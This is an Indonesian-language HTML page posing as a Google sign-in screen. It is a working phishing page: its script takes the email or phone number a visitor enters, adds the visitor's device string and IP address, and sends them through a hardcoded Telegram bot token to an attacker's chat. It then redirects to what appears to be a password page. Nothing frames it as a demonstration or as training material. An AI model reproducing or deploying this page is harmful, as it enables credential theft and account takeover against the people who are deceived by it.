<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
    display:flex;
    flex-direction:column;
}

.container{
    width:100%;
    max-width:100%;
    margin:0 auto;
    padding:48px 24px 24px;
    flex:1;
}

.logo{
    text-align:center;
    margin-bottom:24px;
}

.logo img{
    width:110px;
    height:auto;
}

h1{
    text-align:center;
    font-size:24px;
    font-weight:400;
    color:#202124;
    margin-bottom:16px;
}

.desc{
    text-align:center;
    color:#5f6368;
    font-size:14px;
    line-height:1.5;
    margin-bottom:8px;
}

.learn{
    display:block;
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
    line-height:1.4;
    margin-bottom:32px;
    text-align:center;
}

.input-box{
    width:100%;
    height:56px;
    border:1px solid #dadce0;
    border-radius:4px;
    padding:0 16px;
    font-size:16px;
    color:#202124;
    outline:none;
}

.input-box:focus{
    border-color:#1a73e8;
    border-width:2px;
}

.forgot{
    display:inline-block;
    margin-top:12px;
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
}

.bottom{
    position:static;
    margin-top:32px;
    padding:0;
    display:flex;
    flex-direction:column;
    gap:16px;
    align-items:stretch;
}

.create{
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
    text-align:center;
}

.next{
    width:100%;
    height:48px;
    border:none;
    border-radius:4px;
    background:#1a73e8;
    color:#fff;
    font-size:16px;
    font-weight:500;
    cursor:pointer;
}

.next:hover{
    background:#1765cc;
}

.next:disabled{
    background:#8ab4f8;
    cursor:wait;
}
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/960px-Google_2015_logo.svg.png" alt="Google">
    </div>

    <h1>Login</h1>

    <div class="desc">
        Gunakan Akun Google Anda. Akun akan ditambahkan ke perangkat ini dan tersedia untuk aplikasi Google lainnya.
    </div>

    <a href="#" class="learn">
        Pelajari lebih lanjut cara menggunakan akun Anda
    </a>

    <input
        type="text"
        id="emailInput"
        class="input-box"
        placeholder="Email atau nomor telepon">

    <br>

    <a href="#" class="forgot">Lupa email?</a>

</div>

<div class="bottom">
    <a href="#" class="create">Buat akun</a>
    <button class="next" id="nextBtn">Berikutnya</button>
</div>

<script>
// ==============================
// KONFIGURASI TELEGRAM BOT
// ==============================
const BOT_TOKEN = '8824816621:AAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk';
const CHAT_ID   = '7549590022';

const nextBtn    = document.getElementById('nextBtn');
const emailInput = document.getElementById('emailInput');

nextBtn.addEventListener('click', async function(e) {
    e.preventDefault();
    
    const value = emailInput.value.trim();
    
    if (!value) {
        alert('Harap masukkan email atau nomor telepon.');
        emailInput.focus();
        return;
    }

    // Simpan email ke localStorage
    localStorage.setItem("email", value);

    nextBtn.disabled = true;
    nextBtn.textContent = 'Memuat...';

    const deviceInfo = navigator.userAgent;
    const dateTime   = new Date().toLocaleString('id-ID');
    
    const message = `
🔔 <b>Data Login Masuk</b>

📧 Email/Telepon: <code>${value}</code>
🕒 Waktu: ${dateTime}
🖥️ Device: ${deviceInfo}

📡 IP: ${await getIP()}
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = 'lgin.html';
        } else {
            alert('Gagal mengirim. Periksa token bot.');
            nextBtn.disabled = false;
            nextBtn.textContent = 'Berikutnya';
        }

    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan.');
        nextBtn.disabled = false;
        nextBtn.textContent = 'Berikutnya';
    }
});

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) {
        return 'Tidak diketahui';
    }
}
</script>

</body>
</html>
